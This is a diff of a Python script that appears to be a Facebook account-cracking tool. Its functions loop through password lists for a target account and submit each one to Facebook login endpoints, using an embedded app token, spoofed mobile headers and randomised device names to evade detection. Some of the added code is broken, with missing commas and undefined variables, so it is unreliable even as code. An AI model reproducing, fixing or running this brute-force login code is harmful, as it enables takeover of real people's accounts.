@@ -957,24 +957,25 @@ def m1(idf,pwv):
             "locale":"en_US","client_country_code":"US",
             'fb_api_req_friendly_name':'authenticate',
             "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
-            accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
-            head = {
-            "method": 'GET', 
-            "path": '/',
-            "scheme": 'https', 
-            "authority": 'p.facebook.com',
-            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            "accept-language": 'en-US,en;q=0.9',
-            "cache-control": 'max-age=0',
-            "sec-ch-ua": '"Chromium";v="111", "Not(A:Brand";v="8"',
-            "sec-ch-ua-mobile": '?1',
-            "sec-ch-ua-platform": '"Android"',
-            "sec-fetch-dest": 'document',
-            "sec-fetch-mode": 'navigate',
-            "sec-fetch-site": 'none',
-            "sec-fetch-user": '?1',
-            "upgrade-insecure-requests": '1',
-            "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',}
+            head ={
+            "x-fb-request-analytics-tags": '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}', 
+            "x-fb-ta-logging-ids": f"graphql:{str(uuid.uuid4())}",
+            "content-type": "application/x-www-form-urlencoded",
+            "x-fb-connection-type": "WIFI",
+            "x-fb-background-state": "1",
+            "x-graphql-request-purpose": "fetch",
+            "user-agent": amul(),
+            "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+            "x-fb-friendly-name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
+            "x-graphql-client-library": "graphservice",
+            "x-fb-privacy-context": "3643298472347298",
+            "x-fb-device-group": "3273",
+            "x-tigon-is-retry": "False",
+            "priority": "u=3,i",
+            "accept-encoding": "gzip, deflate",
+            "x-fb-http-engine": "Liger",
+            "x-fb-client-ip": "True",
+            "x-fb-server-cluster": "True"}
             url ='https://m.facebook.com/auth/login'
             twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
             q = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
@@ -1002,55 +1003,39 @@ def m1(idf,pwv):
         pass
 def m2(idf,pwv):
     global loop, ok, cp
-    gsx = ('Infinix X689B', 'Samsung Galaxy S21', 'Google Pixel 5', 'OnePlus 9', 'Xiaomi Mi 11','LG V60 ThinQ', 'Sony Xperia 1 II', 'Huawei P40 Pro', 'Motorola Edge+', 'Nokia 8.3','OnePlus Nord', 'Xiaomi Redmi Note 10 Pro', 'Google Pixel 4a', 'Samsung Galaxy A52','Sony Xperia 5 II', 'LG Velvet', 'Motorola Moto G Power', 'Nokia 7.2', 'Huawei Mate 40 Pro','Samsung Galaxy S20 FE', 'OnePlus 8T', 'Xiaomi Poco X3', 'Google Pixel 4 XL', 'Sony Xperia 10 II','Motorola Razr', 'LG Wing', 'Nokia 9 PureView', 'Huawei P30 Pro', 'Samsung Galaxy Note 20 Ultra','OnePlus 8 Pro', 'Xiaomi Mi 10 Pro', 'Google Pixel 3a XL', 'Sony Xperia 1 III', 'LG G8 ThinQ','Motorola Moto G Stylus', 'Nokia 6.2', 'Huawei Mate Xs', 'Samsung Galaxy Z Fold 2','OnePlus 7T Pro', 'Xiaomi Mi 9T Pro', 'Google Pixel 3 XL', 'Sony Xperia 5 III', 'LG G7 ThinQ','Motorola Moto G Fast', 'Nokia 5.3', 'Huawei Nova 7i', 'Samsung Galaxy Z Flip', 'OnePlus 7 Pro','Xiaomi Mi Note 10', 'Google Pixel 3a', 'Sony Xperia XZ3', 'LG K92 5G', 'Motorola Moto G Play','Nokia 3.4', 'Huawei Y9s', 'Samsung Galaxy S10 Lite', 'OnePlus Nord N10', 'Xiaomi Redmi Note 9 Pro','Google Pixel 3', 'Sony Xperia XZ2', 'LG K61', 'Motorola Moto G9 Power', 'Nokia 2.4','Huawei P20 Pro', 'Samsung Galaxy A71', 'OnePlus Nord N100', 'Xiaomi Redmi Note 8 Pro','Google Pixel 2 XL', 'Sony Xperia L4', 'LG Q70', 'Motorola Moto E7 Plus', 'Nokia 1.3','Huawei P Smart 2021', 'Samsung Galaxy A50', 'OnePlus 6T', 'Xiaomi Redmi Note 7 Pro','Google Pixel 2', 'Sony Xperia 10 Plus', 'LG K51', 'Motorola Moto E6', 'Nokia 1 Plus','Huawei P10', 'Samsung Galaxy A20', 'OnePlus 6', 'Xiaomi Mi A3', 'Google Pixel XL','Sony Xperia XA2', 'LG Stylo 6', 'Motorola Moto E5 Plus', 'Nokia 2.3')
+    xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
     run=f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/293.0.0.43.120;FBBV/251953326;FBDM/{density=3.0,width=1080,height=2076};FBLC/es_LA;FBRV/253044889;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]"
     animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
     sys.stdout.write(f'\r{P} [{animasi}-{H}M2{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
     sys.stdout.flush()
     try:
       for pw in pwv:
+            gtt=random.choice(xxxxx)
             data = {
-            "email": idf,
-            "password": pw,
-            "method": "post",
-            "pretty": "false",
-            "format": "json",
-            "server_timestamps": "true",
-            "locale": "en_US",
-            "purpose": "fetch",
-            "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
-            "fb_api_caller_class": "graphservice",
-            "client_doc_id": str(random.randint(111111111111111111111111111111,999999999999999999999999999999)),
-            "lois_settings": "lois_token",
-            "lara_override": "server_params",
-            "is_from_logged_out": "0",
-            "layered_homepage_experiment_group": "null",
-            "device_id": str(uuid.uuid4()),
-            "waterfall_id": str(uuid.uuid4()),
-            "INTERNAL__latency_qpl_instance_id": "71821365400215",
-            "is_platform_login": "0",
-            "header_transparency_event_location": "login",
-            "INTERNAL__latency_qpl_marker_id": str(random.randint(11111111,99999999)),
-            "family_device_id": str(uuid.uuid4()),
-            "offline_experiment_group": "caa_iteration_v6_perf_fb_2",
-            "INTERNAL_INFRA_THEME": "harm_f",
-            "headers_flow_id": str(uuid.uuid4()),
-            "transparency_event_type": "affirmative_action",
-            "header_transparency_event_name": "login_button_clicked",
-            "is_from_logged_in_switcher": "0",
-            "bloks_versioning_id": "c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec",
-            "app_id": "com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
-            "scale": "2",
-            "styles_id": "e6c6f61b7a86cdf3fa2eaaffa982fbd1",
-            "using_white_navbar": "True",
-            "pixel_ratio": "2",
-            "is_push_on": "True",
-            "bloks_version": "c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec",
-            "fb_api_analytics_tags": '["GraphServices"]',
-            "client_trace_id": str(uuid.uuid4()),
-            "generate_session_cookies": "1",
-            "generate_analytics_claim": "1",
-            "error_detail_type": "button_with_disabled"}
+            'adid':str(uuid.uuid4())
+            'format':'json',
+            'device':gtt,
+            'device_id':str(uuid.uuid4())
+            'email':ids,
+            'password':pas,
+            "logged_out_id": str(uuid.uuid4()),
+            "hash_id": str(uuid.uuid4()),
+            "reg_instance": str(uuid.uuid4()),
+            "session_id": str(uuid.uuid4()),
+            "advertiser_id": str(uuid.uuid4()),
+            'generate_analytics_claims':'1',
+            'credentials_type':'password',
+            'source':'login',
+            "sim_country": "id",
+            "network_country": "id",
+            "relative_url": "method/auth.login",
+            'error_detail_type':'button_with_disabled',
+            'enroll_misauth':'false',
+            'generate_session_cookies':'1',
+            'generate_machine_id':'1',
+            "locale":"en_US","client_country_code":"US",
+            'fb_api_req_friendly_name':'authenticate',
+            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
             head = {
             "x-fb-request-analytics-tags": '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}', 
             "x-fb-ta-logging-ids": f"graphql:{str(uuid.uuid4())}",
